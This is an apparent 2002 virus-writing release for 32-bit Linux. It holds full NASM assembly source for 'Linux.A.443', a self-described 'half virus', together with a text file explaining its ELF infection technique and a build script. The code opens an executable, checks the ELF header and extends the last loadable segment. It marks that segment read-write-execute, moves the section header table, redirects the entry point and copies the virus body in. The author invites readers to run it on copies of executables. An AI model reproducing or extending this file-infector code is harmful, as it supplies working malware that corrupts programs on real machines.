
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[A.ASM]ÄÄÄ
; /* ---------------------------------------------------
;   |                                                   |
;   |  >>> The(c)King1980 <<<                           |
;   |                                                   |
;   |  E-Mail   : TheKing1980@hotmail.com               |
;   |  Internet : http://www.geocities.com/Eureka/2675  |
;   |                                                   |
;    --------------------------------------------------- */
;
; TO COMPILE:
;
;	nasm -f elf a.asm
;	gcc a.o -s -o a
;	elfwrsec a
;
section .text

global main

%define	VIRSIZE	_1stHOST - main

main:
	PUSHF
	PUSHA
	CALL	First

	DD	0				; 0	FileHandle
	DB	061h,09Dh,068h
	DD	_1stHOST			; 7	Old ENTRYPOINT
	DB	0C3h
	DB	'1',0				; 12	FileName

First:
	POP	ebp

	MOV	ebx,ebp
	ADD	ebx,12
	CALL	Infect				; ebx <- FileName

	ADD	ebp,4
	JMP	ebp

Infect:
	MOV	eax,5
	XOR	edx,edx
	XOR	ecx,ecx
	INC	ecx
	INC	ecx
	INT	80h				; SYS_OPEN
	TEST	eax,eax
	JS	Quit1
	MOV	[ebp],eax

	XCHG	eax,ebx
	MOV	eax,19
	XCHG	ecx,edx
	INT	80h				; SYS_LSEEK
	MOV	esi,eax

	PUSH	eax
	XOR	eax,eax
	XOR	edx,edx
	INC	ah
	INC	ah
	PUSH	eax
	PUSH	ecx
	PUSH	ebx
	INC	ecx
	PUSH	ecx
	INC	ecx
	INC	ecx
	PUSH	ecx
	PUSH	eax
	PUSH	edx
	MOV	eax,90
	MOV	ebx,esp
	INT	80h				; SYS_MMAP first 512 bytes
	ADD	esp,24
	TEST	eax,eax
	POP	ecx
	POP	edx
	JS	Quit2

	CLC
	CMP	[eax],DWORD 464C457Fh
	JNE	Cont1
	CMP	[eax + 4],DWORD 00010101h
	JNE	Cont1
	CMP	[eax + 16],DWORD 00030002h
	JNE	Cont1
	CMP	[eax + 20],DWORD 1
	JNE	Cont1
	CMP	[eax + 36],DWORD 0
	JNE	Cont1
	CMP	[eax + 12],BYTE 0
	JNE	Cont1				; Check ELF executable header

	MOV	ebx,[eax + 28]
	ADD	ebx,eax
	PUSH	ecx
	MOV	cx,[eax + 44]
Loop1:
	CMP	[ebx],DWORD 1
	JNE	Next1
	MOV	edi,ebx
Next1:
	ADD	bx,[eax + 42]
	LOOP	Loop1				; Find last loadable segment in PH table
	POP	ecx
	MOV	esi,edx
	ADD	edx,[edi + 20]
	SUB	edx,[edi + 16]
	SUB	edi,eax
	STC

Cont1:
	XCHG	eax,ebx
	MOV	eax,91
	INT	80h				; SYS_MUNMAP
	JNC	Quit2
	ADD	edx,VIRSIZE
	MOV	eax,93
	MOV	ebx,[ebp]
	MOV	ecx,edx
	INT	80h				; SYS_FTRUNCATE to new size
	TEST	eax,eax
	JNZ	Quit2

	MOV	ecx,eax
	PUSH	ecx
	PUSH	ebx
	INC	ecx
	PUSH	ecx
	INC	ecx
	INC	ecx
	PUSH	ecx
	PUSH	edx
	PUSH	eax
	MOV	eax,90
	MOV	ebx,esp
	INT	80h				; SYS_MMAP whole file
	ADD	esp,24
	TEST	eax,eax
	JS	Quit2
	ADD	edi,eax

	PUSH	edx
	MOV	[eax + 12],BYTE 1		; Set infection flag

	XCHG	edx,edi
	MOV	ebx,edi
	SUB	ebx,esi
	MOV	ecx,esi
	SUB	ecx,[edx + 4]
	SUB	ecx,[edx + 16]
	ADD	esi,eax
	ADD	edi,eax
	STD
	REP	MOVSB				; Move SH table

	MOV	ecx,[edx + 20]
	ADD	ecx,[edx + 8]
	PUSH	ecx				; ecx <- New ENTRYPOINT
	PUSH	edi

	PUSH	eax
	XOR	eax,eax
	MOV	ecx,ebx
	REP	STOSB
	POP	eax				; Clean up rest

	XCHG	edx,edi
	PUSH	ebx
	ADD	ebx,[edi + 16]
	MOV	[edi + 16],ebx
	MOV	[edi + 20],ebx			; Fix PH segment sizes (p_filesz, p_memsz)
	MOV	[edi + 24],DWORD 7		; Set PH segment flags to READ + WRITE + EXEC
	POP	ebx
	SUB	esi,eax

	ADD	[eax + 32],ebx			; Fix SH table position
	MOV	edi,[eax + 32]
	ADD	edi,eax
	XOR	ecx,ecx
	MOV	cx,[eax + 48]
Loop2:
	CMP	[edi + 16],esi
	JB	Next2
	ADD	[edi + 16],ebx
Next2:
	ADD	di,[eax + 46]
	LOOP	Loop2				; Fix SH table offsets

	POP	edi
	MOV	ecx,VIRSIZE
	SUB	edi,ecx
	POP	esi

	PUSH	DWORD [ebp + 7]
	MOV	edx,[eax + 24]
	MOV	[ebp + 7],edx
	MOV	[eax + 24],esi			; Set New ENTRYPOINT

	MOV	esi,ebp
	SUB	esi,7
	CLD
	REP	MOVSB				; Copy virus
	POP	DWORD [ebp + 7]

	XCHG	eax,ebx
	MOV	eax,91
	POP	ecx
	INT	80h				; SYS_MUNMAP

Quit2:
	MOV	eax,6
	MOV	ebx,[ebp]
	INT	80h				; SYS_CLOSE

Quit1:
	RET

_1stHOST:
	MOV	eax,1
	MOV	ebx,0
	INT	80h				; SYS_EXIT
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[A.ASM]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[INTRO.TXT]ÄÄÄ
Half virus: Linux.A.443
=======================

	There's an interesting way how to infect ELF executable files under
Linux operating system.



Introduction
------------

	You should know that every executable file consists of ELF header, of
Program header table (PH) and finally of Section header table (SH). ELF header
contains some basic information like object type (ET_EXEC), machine (EM_386)
and so on. Program header table describes program's segments (.text - code
segment, .data - data segment), for whitch will be allocated virtual memory when
the program is being executed. Section header table describes other segments not
really important for us. PH table usually follows ELF header that starts at
offset 0 in the file. SH table usually lies at the end of file.
	The most important fields of ELF header are: e_entry (entrypoint),
e_phoff (PH table's file offset), e_phentsize (size of one entry), e_phnum
(number of entries in PH table), similarly e_shoff, e_shentsize and e_shnum.
PH table contains this fields: p_type (PT_LOAD), p_offset (offset from the
beginning of the file at which the first byte of the segment resides), p_vaddr
(virtual address of the segment in memory), p_filesz (size of the segment in
the file), p_memsz (size of the segment in memory - may be bigger than p_filesz)
and p_flags (PF_R, PF_W, PF_X, read write executable). SH table contains
information about all file's sections (.bss, .init, .fini, .note and so on).



Technique
---------

	The infection technique is as follows. First we should check the ELF
header: e_ident == 'ELF' + next 0x01 means 32-bit objects, next 0x01 means LSB
data encoding (Intel CPU), next 0x01 is file version. Then e_type == ET_EXEC,
e_machine == EM_386 and so on.
	Next we have to find the last loadable segment in the PH table. So we
start searching in all PH entries for p_type == PT_LOAD. The last loadable
segment may be the data segment (if there is any) or code segment in case that
there is no data segment. We can be sure the p_vaddr field in this entry is the
greatest, because the entries in PH table are sorted. Now we have to increase
the size of the file by the virus size (which is 443 bytes) plus the difference
between p_memsz and p_filesz. That is why we have to make sure our virus code
remains safely in the file and in the memory. Then we can move SH table, which
usually follows the last loadable segment to the end of the file so as the new
infected file looks very similary to the original. Then it's recommended to zero
out the space between the end of last loadable segment and the beginning of the
SH table. Now we can calculate the new entrypoint - it'll be p_vaddr + p_memsz.
Next we have to fix the changes in our PH entry: p_memsz = p_filesz += (443 +
p_memsz - p_filesz) and p_flags = 7 (PF_R | PF_W | PF_E). In the ELF header
we have to fix the SH table offset like e_shoff += (443 + oldmemsz - oldfilesz)
and in the SH table we have to fix the file offsets for the sections which has
sh_offset > end of the last loadable segment. Last we have to save the old
entrypoint and set the new one and finally to copy our virus body.



Source code
-----------

	The source code of the DEMO half virus is in linux443.tgz archive under
name a.asm . To compile it you need Netwide Assembler and elfwrsec utility
which you'll find in elfwrsec.tgz archive.



Last words
----------

	In the end I would like to say that this is NOT a COMPLETE virus, it's
just a program which infects one file with exactly given name (default name is
'1'). There's not any payload nor any function for searching for targets, so
that's why I call this program HALF virus. Feel free to try it out on any Linux
machine, get a copy of any executable, rename it to '1', run 'a' and watch the
beauty...



Disclaimer
----------

	I wrote this simple program only for demonstrating an interesting way of
ELF file infection.

	I DON'T TAKE ANY RESPONSIBILITY FOR RESULTS CAUSED BY RUNNING A MODIFIED
COPY OF THIS CODE.



Pavel Pech, TheKing1980@hotmail.com

03/02/2002
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[INTRO.TXT]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[COMPILE]ÄÄÄ
#!/bin/sh
./nasm -f elf a.asm
gcc a.o -s -o a
./elfwrsec a
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[COMPILE]ÄÄÄ
